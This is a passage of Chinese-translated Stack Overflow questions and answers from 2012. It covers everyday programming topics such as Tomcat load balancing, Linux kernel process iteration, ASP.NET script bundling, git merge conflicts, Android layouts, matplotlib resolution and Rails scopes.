<Engine name="Catalina" defaultHost="localhost" jvmRoute="worker1">         
     <Cluster className="org.apache.catalina.ha.tcp.SimpleTcpCluster"/> 
```

如果需要更多提取物，我可以上传它们

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T12:15:46.660

您使用粘性会话配置负载平衡的方式（对我来说看起来不错）意味着一旦创建了会话，后续请求将被定向到同一个 Tomcat 实例。您可以通过查看应附加的会话 cookie 值`.worker1`或`.worker2`的会话 cookie 值来识别这一点。Apache HTTPD 使用此后缀来决定将传入请求发送到哪个 Tomcat 实例。

如果没有会话 cookie，则应以循环方式在可用的 Tomcat 之间分发请求。因此，为了测试负载平衡，您通常需要多个浏览器实例来保存不同的会话 cookie。或者尝试设置`sticky_session=false`以查看*所有*请求转发的循环样式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-20T10:29:15.903

**来自阿帕奇**：

*   所有会话属性都必须实现 java.io.Serializable
*   取消注释 server.xml 中的 Cluster 元素
*   如果您定义了自定义集群阀，请确保您有 ReplicationValve - 在 server.xml 中的 Cluster 元素下也被罚款
*   如果您的 Tomcat 实例在同一台机器上运行，请确保每个实例的 tcpListenPort 属性是唯一的，在大多数情况下，Tomcat 足够聪明，可以通过自动检测 4000-4100 范围内的可用端口自行解决此问题。 xml有元素
*   如果您使用的是 mod_jk，请确保 jvmRoute 属性已在您的 Engine 中设置，并且 jvmRoute 属性值与您在 workers.properties 中的工作人员名称相匹配
*   确保所有节点具有相同的时间并与 NTP 服务同步！确保您的负载均衡器配置为粘性会话模式。

我会先尝试 **确保 jvmRoute 正常**

`Session stickyness is not implemented using a tracking table for sessions. Instead each Tomcat instance gets an individual name and adds its name at the end of the session id. When the load balancer sees a session id, it finds the name of the Tomcat instance and sends the request via the correct member worker. For this to work you must set the name of the Tomcat instances as the value of the jvmRoute attribute in the Engine element of each Tomcat's server.xml. The name of the Tomcat needs to be equal to the name of the corresponding load balancer member. In the above example, Tomcat on host "myhost1" needs jvmRoute="worker1", Tomcat on host "myhost2" needs jvmRoute="worker2".`

你的 tomcat 2 jvmRoute 应该是“worker2”

# linux-kernel - 从模块中读取 /proc

> ID：12192637
> 
> 赞同：3
> 
> 时间：2012-08-30T08:16:29.800
> 
> 标签：linux-kernel, linux-device-driver

也许我只是在谈论这个错误。

我有一个 Linux 模块（Ubuntu 12.04），它需要收集有关当前进程的信息，例如每个进程打开的文件数等。我认为做到这一点的最佳方法是让模块读取 /proc 并为那里表示的每个进程在 /proc 子目录中查找它想要的信息。

显然我的模块不能调用 opendir/readdir。我原以为有一个 proc_readdir() 可以从内核空间使用，但我似乎找不到任何关于它的信息。

我错过了什么吗？模块有没有更好的方法来收集进程信息？如果是 proc_readdir() 那么我在哪里可以找到一些例子呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-10T08:56:40.223

如果您只是转向内核空间编程，您可能需要很长时间才能习惯以正确的方式做事。/proc 只是内核空间数据结构的一个接口，并且是一个不方便的接口（所有的 ASCII 会怎样）。当你在内核中时，你可以直接访问你想要的数据。

您应该查看进程 task_struct 条目（请参阅[http://lxr.linux.no/linux+v3.5.3/include/linux/sched.h](http://lxr.linux.no/linux+v3.5.3/include/linux/sched.h)）。如果您想遍历每个进程，请尝试以下操作：

```
struct task_struct *task;
for_each_process(task) {
    printk(KERN_INFO "Process %i is named %s\n", task->pid, task->comm); 
} 
```

您还可以通过 pid using 找到特定任务`find_task_by_pid_ns`，但您必须担心 pid 命名空间。还有`get_current`，它会找到你当前正在执行的任务。

# android - 我想知道在哪里可以找到支持android的webdriver pacakge

> ID：12192640
> 
> 赞同：2
> 
> 时间：2012-08-30T08:16:42.863
> 
> 标签：android

我想使用 Selenium 来执行 Android 的 web 测试。用 python 编写测试代码。但是我找不到一个支持 android 的 webdriver pacakge。有人教我吗？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T03:14:00.183

您可以在 Android SDK Manager -> Extras 中找到它

![在此处输入图像描述](../Images/413ef4698236a2cc1ba776d2f6356f04.png)

# tabs - 如何添加带有外部链接的自定义选项卡按钮？

> ID：12192641
> 
> 赞同：3
> 
> 时间：2012-08-30T08:16:43.807
> 
> 标签：tabs, customization, mediawiki

使用 Mediawiki 1.19 并希望在选项卡按钮“页面”和“讨论”旁边添加带有外部链接的选项卡。怎么做？

*   Extension:DynamicTabs 不起作用，因为它在矢量皮肤方面存在问题。
*   常见问题解答中的步骤[：如何在我的 wiki 中添加/删除选项卡？](http://www.mediawiki.org/wiki/Manual%3aFAQ#How_do_I_add.2Fremove_tabs_throughout_my_wiki.3F)根本没有任何效果。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T12:20:16.147

常见问题解答中的代码已过时。对于较新版本的 MediaWiki，您必须使用[SkinTemplateNavigation](http://www.mediawiki.org/wiki/Manual%3aHooks/SkinTemplateNavigation)挂钩而不是[SkinTemplateContentActions](http://www.mediawiki.org/wiki/Manual%3aHooks/SkinTemplateContentActions)挂钩。我更新[了常见问题解答](http://www.mediawiki.org/wiki/Manual%3aFAQ#How_do_I_add.2Fremove_tabs_throughout_my_wiki.3F)。基本上，您需要执行以下操作：

```
$wgHooks['SkinTemplateNavigation'][] = 'replaceTabs';
function replaceTabs( $skin, &$links) {  
        $links['namespaces']['name_of_tab'] = array(
                'class' => false or 'selected', // if the tab should be highlighted
                'text' => 'text_of_tab', // what the tab says
                'href' => 'url_to_point_to', // where it links to
                'context' => 'main',
        );
        return true;
} 
```

# debugging - 读取 x86 内存

> ID：12192645
> 
> 赞同：0
> 
> 时间：2012-08-30T08:16:53.120
> 
> 标签：debugging, memory, assembly, eip

假设四字节内存空间中有一些十六进制内容。

根据我的一些互联网资源，听说内存的内容应该是向后读取的。因此，如果 0011AA33 中的内容是十六进制的 96223346，实际上，它应该是 46332296 吗？还是这只适用于 EIP>

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T08:21:25.017

这取决于您如何解释数据以及如何进行读取。x86 确实是[little-endian 架构](http://en.wikipedia.org/wiki/Endianness)。

这仅在您读取多字节值（例如 32 位整数）时才重要。一旦一个值在寄存器中，如果它是使用知道大小的操作加载的，它将具有正确的字节顺序。

# asp.net-mvc-4 - 为什么使用@Scripts.Render("~/bundles/jquery")

> ID：12192646
> 
> 赞同：222
> 
> 时间：2012-08-30T08:16:54.747
> 
> 标签：asp.net-mvc-4, asp.net-optimization

如何

```
@Scripts.Render("~/bundles/jquery") 
```

与像这样从 html 引用脚本不同

```
<script src="~/bundles/jquery.js" type="text/javascript"></script> 
```

有没有性能提升？

* * *

## 回答 #1

> 赞同：295
> 
> 时间：2012-08-30T08:22:02.727

捆绑就是将几个没有任何格式（也称为缩小）的 JavaScript 或样式表文件压缩到一个文件中，以节省带宽和加载页面的请求数。

例如，您可以创建自己的包：

```
bundles.Add(New ScriptBundle("~/bundles/mybundle").Include(
            "~/Resources/Core/Javascripts/jquery-1.7.1.min.js",
            "~/Resources/Core/Javascripts/jquery-ui-1.8.16.min.js",
            "~/Resources/Core/Javascripts/jquery.validate.min.js",
            "~/Resources/Core/Javascripts/jquery.validate.unobtrusive.min.js",
            "~/Resources/Core/Javascripts/jquery.unobtrusive-ajax.min.js",
            "~/Resources/Core/Javascripts/jquery-ui-timepicker-addon.js")) 
```

并像这样渲染它：

```
@Scripts.Render("~/bundles/mybundle") 
```

`@Scripts.Render("~/bundles/mybundle")`与本机相比的另一个优势`<script src="~/bundles/mybundle" />`是`@Scripts.Render()`它将尊重`web.config`调试设置：

```
 <system.web>
    <compilation debug="true|false" /> 
```

如果`debug="true"`那样，它将改为为每个源脚本呈现单独的脚本标签，而不进行任何缩小。

对于样式表，您必须使用 StyleBundle 和 @Styles.Render()。

不是通过单个请求（使用脚本或链接标签）加载每个脚本或样式，而是将所有文件压缩为单个 JavaScript 或样式表文件并一起加载。

* * *

## 回答 #2

> 赞同：51
> 
> 时间：2013-10-07T19:12:19.113

您还可以使用：

```
@Scripts.RenderFormat("<script type=\"text/javascript\" src=\"{0}\"></script>", "~/bundles/mybundle") 
```

在需要使用 Charset、Type 等的场景中指定输出格式。

# android - com.android.camera.action.CROP 调整裁剪矩形的大小

> ID：12192647
> 
> 赞同：1
> 
> 时间：2012-08-30T08:16:55.770
> 
> 标签：android, image, crop

根据此示例[http://www.londatiga.net/featured-articles/how-to-select-and-crop-image-on-android/](http://www.londatiga.net/featured-articles/how-to-select-and-crop-image-on-android/) ，我刚刚在我的应用程序中实现了图像裁剪活动。

我想要实现的是一个被裁剪成正方形的图像，其尺寸与原始图像的较小尺寸相同，例如图像 400 x 600 会导致裁剪图像 400 x 400。不幸的是，确定裁剪图像的矩形无论我设置的输入如何，大小都不会填充图像并保持不变`Intent("com.android.camera.action.CROP")`。

```
 Intent intent = new Intent("com.android.camera.action.CROP");
        intent.setType("image/*");
        intent.setData(mImageCaptureUri);
        intent.putExtra("outputX", widthHeight);
        intent.putExtra("outputY", widthHeight);
        intent.putExtra("crop", "true");  
        intent.putExtra("aspectX", 1);  
        intent.putExtra("aspectY", 1);  
        intent.putExtra("noFaceDetection", true);  
        intent.putExtra("return-data", true); 
```

![未缩放到最大高度的裁剪矩形示例](../Images/e98be49b089dddd8dd435d8d69d9ed3a.png)

我这是由于我使用的 android 模拟器或者我该如何改变它？

第二个问题：谁能告诉我是否可以以某种方式设置这个 Intent 的样式？

非常感谢！！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-29T21:18:47.087

纵横比值定义尺寸比例（x/y）。如果你想要自由尺寸，你应该删除

```
intent.putExtra("aspectX", 1);  
intent.putExtra("aspectY", 1); 
```

价值观。或者，如果您想要新的宽高比，您可以为它们分配新的整数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-07-10T15:18:33.797

您只需删除 4 行

**(1)**

```
intent.putExtra("outputX", widthHeight);

intent.putExtra("outputY", widthHeight); 
```

**(2)**

```
intent.putExtra("aspectX", 1);  
intent.putExtra("aspectY", 1); 
```

它将裁剪矩形

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-01-31T15:59:16.973

cropIntent.putExtra("aspectX", 0); cropIntent.putExtra("aspectY", 1);

# git - Git Help UserInterfaceState.xcuserstate：警告：合并冲突：文件仍标记为冲突

> ID：12192649
> 
> 赞同：3
> 
> 时间：2012-08-30T08:17:10.850
> 
> 标签：git, xcode4

我有一个项目我一直在 Xcode 4.4.1 中工作，并想回到以前的分支。（注意分支并不复杂，而是代表线性发展）

当我选择上一个分支时出现警告

```
UserInterfaceState.xcuserstate: warning: Merge conflict: File still marked as conflicted 
```

一切看起来都很好，但是所有的构建和运行菜单项都是灰色的，所以我什么也做不了。

我试图恢复到最新的分支，这看起来不错，但仍然存在合并冲突 MyProject.xcodeproj/project.xcworkspace/xcuserdata/ian.xcuserdatad/UserInterfaceState.xcuserstate：警告：合并冲突：文件仍标记为冲突

我尝试了 git status，但没有帮助

```
# Unmerged paths:
...
#   deleted by them:    MyProject.xcodeproj/project.xcworkspace/xcuserdata/ian.xcuserdatad/UserInterfaceState.xcuserstate
#
# Changes not staged for commit:
...
#
#   deleted:    MyProject.xcodeproj/xcuserdata/ian.xcuserdatad/xcschemes/QuollEyeTree.xcscheme 
```

我尝试了一个 git reset HEAD，但这似乎没有帮助，我不知道从这里去哪里。

Git 可以方便地根据以前的版本检查代码，但每当我尝试交换版本时就会遇到麻烦。

当我尝试创建工作区并添加另一个项目时，我当前的问题似乎更加严重。原始项目是在 Xcode 3 下创建的，项目和文件直接位于项目目录下。

编辑 - 已解决

下面的答案没有解决问题，但都有帮助。

我从项目目录中保存了我的代码，删除了最新的分支

```
git reset --hard HEAD~1 
```

然后将更改的文件复制回项目目录

我还更新了我的 .gitignore （我以为我以前做过）

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-07-15T23:55:57.953

在解决我的冲突后，我遇到了同样的问题，这就是我解决它的方法。如果您使用 Xcode 来跟踪您的 git 存储库，请尝试以下操作。1.我解决了所有的冲突，然后保存了解决的文件。2\. 转到文件 -> 源代码管理 -> 标记为已解决

Voila Xcode 不再将这些文件识别为有冲突。希望这对某人有用。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-19T15:21:42.757

跑步

```
git mergetool 
```

解决冲突为我解决了问题。

作为旁注，我使用 Command-D 导航到冲突，在 FileMerge 的右下角选择一侧，然后在完成保存并退出后使用 Command-S Command-Q（在 Mac 上）。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-08-30T08:57:18.317

当存在合并冲突时，您必须首先解决它。（好吧，也许您可​​以运行`git merge --abort`以恢复）。

所以这个过程是你打开你的冲突文件，你寻找冲突，解决它（编辑冲突的行），然后保存你的文件，添加它（使用`git add -u`）并提交它。

然后你可以在一个干净的工作目录上工作。

顺便说一句，冲突可能看起来像：

```
<<<<<<< yours:sample.txt
Conflict resolution is hard;
let's go shopping.
=======
Git makes conflict resolution easy.
>>>>>>> theirs:sample.txt 
```

参考：[http ://www.kernel.org/pub/software/scm/git/docs/git-merge.html](http://www.kernel.org/pub/software/scm/git/docs/git-merge.html)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-30T09:07:47.793

首先，养成添加`*.xcuserstate`和模式以忽略其他用户特定项目文件到您的`.gitignore`. .gitignore 文件有一个流行的 github 存储库，其中一个用于 Xcode 项目。

除了解决合并冲突（如前所述）之外，您还应该养成一个好习惯，在检出不同的头（分支、标签等）时隐藏您的更改。

# ruby - 将 IO.popen 的输出重定向到日志文件

> ID：12192650
> 
> 赞同：2
> 
> 时间：2012-08-30T08:17:13.993
> 
> 标签：ruby, wkhtmltopdf, pdfkit

我正在运行[PDFKit Gem](https://github.com/jdpace/PDFKit)以使用[wkhtmltopdf](http://code.google.com/p/wkhtmltopdf/)生成 pdf 。

在我的项目上运行规范或生成 PDF 时，wkhtmtopdf 会将其输出泄漏到`stdout`/ 不同的日志中，但我希望在我的应用程序的单独日志文件 pdfkit.log 中生成所有输出。

wkhtmltopdf 的调用很简单

```
result = IO.popen(invoke, "wb+") do |pdf|
  pdf.puts(@source.to_s) if @source.html?
  pdf.close_write
  pdf.gets(nil)
end 
```

[根据 IO.popen > Kernel.spawn 文档](http://ruby-doc.org/core-1.9.3/Kernel.html#method-i-spawn)，我尝试重新配置`IO.popen`调用以将所有输出放入日志文件（`:err => [:child, :out]`应该合并`stderr`和`stdout`，并且`:out=>[File.join(Rails.root, 'log', 'pdfkit.log'), "w"]`应该写入指定的日志文件）

```
result = IO.popen(invoke, "wb+", :out=>[File.join(Rails.root, 'log', 'pdfkit.log'), "w"], :err=>[:child, :out]) do |pdf|
  pdf.puts(@source.to_s) if @source.html?
  pdf.close_write
  pdf.gets(nil)
end 
```

该方法的覆盖已经到位，但不幸的是没有按预期工作。我知道错误是我误解了 的选项`IO.popen`，但我不明白如何..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T10:02:10.143

```
$stdout.reopen("out.txt", "w")
$stderr.reopen("err.txt", "w") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-05T21:47:07.003

也许尝试这样的事情：

```
in_io_pipe, out_io_pipe = IO.pipe
out = File.new(File.join(Rails.root, 'log', 'pdfkit.log'), 'w+')
pid = Process.spawn(cmd, :out => out, :in => in_io_pipe, :err => out)
Process.detach(pid)
out_io_pipe.puts("something") 
```

# css - 字母间距css后的内容

> ID：12192653
> 
> 赞同：2
> 
> 时间：2012-08-30T08:17:26.973
> 
> 标签：css, typography, letter-spacing

我的目的是在伪元素的内容中包含两个字母，每个字母之间的间距为 1 像素。

我已经尝试了显而易见的方法，它分配了`letter-spacing`1 个像素：

```
#tweetList > li > .blockstyle > blockquote p.tweettext:before{
    content: '\2018\2019';
    font-family: 'ocr';
    font-style: normal;
    font-weight: 400;
    position: absolute;
    font-size: 120px;
    top: 0px;
    left: -120px;
    color: rgba(26,114,189, 1);
    text-shadow: 7px 14px 10px rgba(0, 0, 0, 0.1);
    letter-spacing: 1px;
} 
```

问题是两个撇号没有得到所需的间距。这是结果的快照：

![结果撇号间距](../Images/5a1e9f986ab3846d7415bf9ee6876120.png)

这就是我想要实现的目标：

![所需的撇号间距](../Images/ce746694e59c6661137d2ee9321d0ae7.png)

怎么做到呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:29:07.433

### 问题

问题在于字形的宽度。由于每个撇号字母的宽度都比实际字形多，因此它们似乎已离开。

### 解决方案

为了解决这个问题，通过分配一个负值来调整字母间距，如下所示：

```
#tweetList > li > .blockstyle > blockquote p.tweettext:before{
    content: '\2018\2019';
    font-family: 'ocr';
    font-style: normal;
    font-weight: 400;
    position: absolute;
    font-size: 120px;
    top: 0px;
    left: -120px;
    color: rgba(26,114,189, 1);
    text-shadow: 7px 14px 10px rgba(0, 0, 0, 0.1);
    letter-spacing: -.2em; /* <-- */
} 
```

### 演示

*   [在 dabbet 上](http://dabblet.com/gist/3524155)

# javascript - jQuery滑动一个div

> ID：12192655
> 
> 赞同：1
> 
> 时间：2012-08-30T08:17:35.663
> 
> 标签：javascript, jquery

我想向上滑动一个 div，在它完全向上滑动后，我想`<div>`向下滑动另一个（默认情况下是隐藏的）。

我正在尝试以下代码，它可以满足我的要求，但我只是没有得到第一个完全向上滑动后 div 向下滑动的效果，看起来 div 开始出现，只要另一个 div 开始在上面滑动。

那么我怎样才能让它等到第一个 div 完全向上滑动然后它开始向下滑动。

**HTML：**

```
<div class="box">
    <div class="up"></div>
    <div class="down"></div>
</div>

<a href="#" id="hidediv">Hide me</a> 
```

**CSS：**

```
.up{
    width: 100px;
    height: 100px;
    background: orange;
    display: block;
}

.down{
    width: 100px;
    height: 100px;
    background: red;
    display: none;
} 
```

**jQuery：**

```
$("#hidediv").click(function () {
  $(".up").slideUp(800);
  $(".down").slideDown(800);
}); 
```

**演示：**

[http://jsfiddle.net/hFyvw/](http://jsfiddle.net/hFyvw/)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-30T08:20:17.313

尝试在回调中使用它：

```
$("#hidediv").click(function () {
  $(".up").slideUp(800, function () {
    $(".down").slideDown(800);
  });
}); 
```

这是一个[JSFiddle](http://jsfiddle.net/hFyvw/1/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-30T08:19:59.040

使用slideUp的回调函数：

```
$("#hidediv").click(function () {
  $(".up").slideUp(800, function () {
    $(".down").slideDown(800);
  });
}); 
```

# java - 打印时设置横向方向

> ID：12192656
> 
> 赞同：1
> 
> 时间：2012-08-30T08:17:43.670
> 
> 标签：java, printing, orientation, awt

我需要打印一张图片。当我设置方向时

`printRequestAttributeSet.add(OrientationRequested.LANDSCAPE);`

一切正常。

但是当我在以下`print()`方法中设置方向时`Printable`：

```
public int print(Graphics graphics, PageFormat pageFormat, int pageIndex) throws PrinterException {
            if (pageIndex >= images.size()) 
                return Printable.NO_SUCH_PAGE;

            image = images.get(pageIndex);
            // if image width>height --> Landscape, else --> Protrait
            if (image.getWidth(null) > image.getHeight(null)) 
                pageFormat.setOrientation(PageFormat.LANDSCAPE);
            else 
                pageFormat.setOrientation(PageFormat.PORTRAIT);

            graphics2D = (Graphics2D) graphics;
            graphics.drawImage(image, 0, 0, image.getWidth(null), image.getHeight(null),   null);

            return PAGE_EXISTS;
}; 
```

**它不适用于第一页。即它以横向模式打印除第一页之外的所有页面。**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T11:25:06.480

当您已经尝试打印页面时，您无法更改方向。

如果您需要提供许多具有不同方向的页面，您将需要查看[Book](http://docs.oracle.com/javase/7/docs/api/java/awt/print/Book.html)和[Pageable](http://docs.oracle.com/javase/7/docs/api/java/awt/print/Pageable.html)接口，请参阅[Java](http://www.javaworld.com/jw-12-2000/jw-1201-print.html)中的打印示例。

您唯一的其他解决方案是将图像旋转`Printable`，这充其量是很麻烦的。

ps - 打印很有趣......当它工作时;）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-03-09T19:36:50.903

`pf.setOrientation(PageFormat.LANDSCAPE)`打电话前的地方`printJob`

前任。

```
if(pay_type.getSelectedItem().equals("EMI"))
  {
      EMI();
  }
  else{
       validation();  
  }
   PrinterJob job = PrinterJob.getPrinterJob();
     job.setPrintable((Printable) this);
     boolean ok = job.printDialog();
     if (ok) {
         try {
             //here set page oriatetion
              job.print();
         } catch (PrinterException ex) {
          /* The job did not successfully complete */
         }
     } 
```

# python - matplotlib - 提高分辨率以查看细节

> ID：12192661
> 
> 赞同：41
> 
> 时间：2012-08-30T08:18:02.090
> 
> 标签：python, matplotlib

我有一个由任务（大约 600 个）组成的大流程，我创建了一个图形来观察它们的启动顺序和它们花费的时间。为此，我使用了 matplotlib 和 barh。

这个数字还可以（我的第一个 matplotlib 成功！），但是：

*   我想在导出时查看详细信息并缩放图片（例如 PNG），因为当 matplotlib 使用`show()`命令显示结果时，缩放选项允许
*   Y 轴的图例太接近且不可读

我试图像[其他 SO 帖子](https://stackoverflow.com/questions/332289/how-do-you-change-the-size-of-figures-drawn-with-matplotlib)中所说的那样提高分辨率，这更好，但细节不够精确。到目前为止，这是我的结果：

*   完整结果

![满的](../Images/cd722517f40dc1b79e2a7d920246600e.png)

*   使用 matplotlib 进行缩放

![飞涨](../Images/47a7290c01060435257abd6d516fa101.png)

你知道我如何提高可读性吗？非常感谢（否则，我所有的努力都将毫无用处，恐怕......）

PS：我正在使用 matplotlib 1.1.1 和 python 2.7。

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-08-30T15:40:09.243

[在Evert](https://stackoverflow.com/users/707650/evert)的建议下，我设法通过使用非常大的分辨率和非常小的字体来做到这一点。以下是最重要的步骤：

```
import pylab as pl
pl.figure(figsize=(70, 70)) # This increases resolution
pl.savefig('test.eps', format='eps', dpi=900) # This does, too
pl.annotate(..., fontsize='xx-small', ...) 
```

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2012-08-31T09:51:54.463

仅作记录，我将在我的第二条评论中提出的建议也作为可能的答案。这可能并不总是有效，但测试显示出良好的结果：

```
import pylab as pl
pl.figure(figsize=(7, 7))  # Don't create a humongous figure
pl.annotate(..., fontsize=1, ...)   # probably need the annotate line *before* savefig
pl.savefig('test.pdf', format='pdf')   # no need for DPI setting, assuming the fonts and figures are all vector based 
```

它甚至会出现分数字体大小（例如`fontsize=0.1`）的作品。您的里程可能会有所不同：我仅使用 PDF 后端进行了测试，而不是 EPS 后端。

另外：我省略了 DPI 设置。在高分辨率打印机上打印时，您*可能*需要再次使用它。再说一次，您不应该这样做，因为这可能是打印机设置：打印机如何栅格化您的（矢量）PDF 图像。我根本不知道这些“提示”是否可以编码成 postscript/PDF。

# android - 基于Bitmap设置FrameLayout的高宽

> ID：12192667
> 
> 赞同：12
> 
> 时间：2012-08-30T08:18:23.360
> 
> 标签：android, exception

我正在尝试根据`FrameLayout`a 设置 的宽度和高度`Bitmap`，我所做的是在下面

```
 Bitmap theBitmap = BitmapFactory.decodeFile(theFileImage.toString());
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(theBitmap.getWidth(), theBitmap.getHeight());
        frame.setLayoutParams(lp);
        image.setLayoutParams(lp);
        image.setImageBitmap(theBitmap); 
```

但我得到一个`ClassCastException`.

我做错什么了？

编辑：

```
java.lang.ClassCastException: android.widget.LinearLayout$LayoutParams cannot be cast to android.widget.RelativeLayout$LayoutParams 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-30T08:44:36.750

要设置 Layout 参数，您需要使用其父级的内部类 LayoutParams。

例如：如果你在RelativeLayout里面有一个LinearLayout，如果你需要设置LinearLayout的布局参数，你需要使用RelativeLayout的LayoutParams内部类。否则它将给出 ClassCastException。

因此，在您的情况下，要设置 FrameLayout 的 Layoutparams ，您需要使用其父 Layout 的 Layout Params。假设您的布局是这样的：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent" >

<FrameLayout
    android:id="@+id/flContainer"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <ImageView
        android:id="@+id/image"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" />
</FrameLayout>

</RelativeLayout> 
```

代码 ：

```
 FrameLayout frame=(FrameLayout) findViewById(R.id.flContainer);  
    ImageView image=(ImageView) findViewById(R.id.image);
    Bitmap theBitmap = BitmapFactory.decodeFile(theFileImage.toString());
    RelativeLayout.LayoutParams lp = new RelativeLayout.LayoutParams(theBitmap.getWidth(), theBitmap.getHeight());
    frame.setLayoutParams(lp);
    image.setImageBitmap(theBitmap); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:31:30.747

看到`ClassCastException`我假设你在这里做一些非法的事情，几个问题，什么是**frame**和**image**？

如果 frame 是对 FrameLayout 的引用，则您必须使用

`FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(theBitmap.getWidth(), theBitmap.getHeight());`

让我知道这是否有帮助。

# php - 在 PHP 中计算具有真值的多维数组元素

> ID：12192671
> 
> 赞同：1
> 
> 时间：2012-08-30T08:18:29.083
> 
> 标签：php, arrays, count

我想知道计算值设置为 True 的数组元素的最有效方法。

这是我的尝试，但代码有点长。我想知道是否已经有内置功能，或者可以以更智能的方式完成。在这种情况下，我想知道在 $arr['key'][ *uniquekeyname* ]['check'] 中具有 true 的元素的数量。

```
$arr = array();
$arr['keys'] = array(
    'a' => array('check' => true,  'otherinfo' => 'some data'),
    'b' => array('check' => false, 'otherinfo' => 'some data'),
    'c' => array('check' => false, 'otherinfo' => 'some data'),
    'd' => array('check' => true,  'otherinfo' => 'some data'),
);

$numChecked = 0;
foreach($arr['keys'] as $key) {
    if ($key['check']) 
        $numChecked++;          
}

echo $numChecked; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:29:12.330

复杂性将是`O(n)`，所以循环通过它就可以了。

我注意到，也许您想使用三等号运算符`===`来将数组的元素与 进行比较`true`，因为将字段检查设置为另一个值将按现在的方式或与`==`.

```
 'b' => array('check' => 150, 'otherinfo' => 'some data'), 
```

将输出：

```
 3 
```

然而：

```
$numChecked = 0;
foreach($arr['keys'] as $key) {
    if ($key['check'] === true) 
        $numChecked++;          
}

echo $numChecked; 
```

会得到你

```
2 
```

`==`假设你的数组总是只携带真/假值，也许你需要得到它是好的。

# ruby-on-rails-3 - 在运行时定义范围

> ID：12192673
> 
> 赞同：1
> 
> 时间：2012-08-30T08:18:35.413
> 
> 标签：ruby-on-rails-3, activerecord

我有模型`Gateway`，`GatewayType`我正在寻找

```
Gateway.<gateway_type.name> # => Gateway.where(:gateway_type_id => gateway_type.id) 
```

现在这个`<gateway_type.name>`范围应该在运行时创建，类似于在运行时使用如下定义的方法添加类/实例级别的方法

```
class Object
  def metaclass
    class << self
      self
    end
  end
end

# adding class level methods
GatewayType.all.each do |type|
  # adding methods to Gateway
  Gateway.metaclass.class_eval do
    define_method "all_#{type.name}" do
      Gateway.where(:gateway_type_id => type.id)
    end
  end
end 
```

我不想采用上述方法，因为它不允许我添加`all_xyzs`介于两者之间`where`或其他范围之类的

```
Gateway.scope1.all_xyzs.scope2 
```

那么......有什么方法可以`scope`在运行时定义吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:26:22.020

如果你想要`Gateway`一个特定的所有对象`GatewayType`，为什么不这样做呢？

```
gateway_type = GatewayType.find(id)
gateway_type.gateways 
```

我假设在这种情况下你有`has_many :gateways`on `GatewayType`。Rails 中的关联方法允许您将查询限制为特定`GatewayType`对象的网关子集。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:32:23.933

在尝试了很多“评估”和其他东西之后，我得到了以下工作，只是将上面定义的方法替换为

```
 define_method "#{type.name}" do
    where(:gateway_type_id => type.id)
  end 
```

它按照我的意愿工作`Gateway.scope1.xyzs.scope2`

# android - 自 android 4.1 起，android webView 会基于 Chrome 引擎吗？

> ID：12192674
> 
> 赞同：6
> 
> 时间：2012-08-30T08:18:48.190
> 
> 标签：android, webview, chromium, chrome-for-android

根据 2012 年[google I/O talk](http://www.zdnet.com/blog/burnette/google-io-2012-android-fireside-chat/2637)（摘录如下），自 4.1 版起，android webView 将基于 chromium。下载的源代码是否已经如此？

另外，“WebView 和 Chrome 浏览器会是一样的”这句话应该怎么理解呢？这是否意味着 chrome 浏览器将像原来的 android 浏览器一样基于 webView 构建。

> 问：在 Android 上使用 Chrome 时，原来的 Android 浏览器和 WebView 会发生什么变化？
> 
> A：ICS->JB升级不会预装Chrome。WebView 将转换为基于 Chromium 的代码。Android 和 Chrome 工程师正在合作。
> 
> 问：WebView 会更新吗？
> 
> A: 升级操作系统后，WebView 和 Chrome 浏览器是一样的。Chrome 将每 6 周更新一次，但 WebView 不会。只是要小心不要破坏任何东西。

[http://www.zdnet.com/blog/burnette/google-io-2012-android-fireside-chat/2637](http://www.zdnet.com/blog/burnette/google-io-2012-android-fireside-chat/2637)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T23:38:27.510

pierr，根据我在 chromium 源代码中看到的内容，它看起来不像 Chrome 是建立在 WebView 之上的。我可以看到 Chrome 使用了一个名为 ContentView 的新类来充当 Chrome 的“WebView”等价物。

我将解释您提到的声明的方式是 Chrome 和 Android 的 WebView 将共享相同的底层 WebKit 代码以及可能将 Java 层功能连接到 C++ 代码的接口。至少就目前而言，Chrome 可能会使用其自己的类似 webview 的类的实现来实现其目的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-25T23:45:56.463

查看 GrepCode 上的 Android 4.1 源代码表明 webview 只能使用一个提供程序：经典的 webview 提供程序，它基于库存的 Android 浏览器。

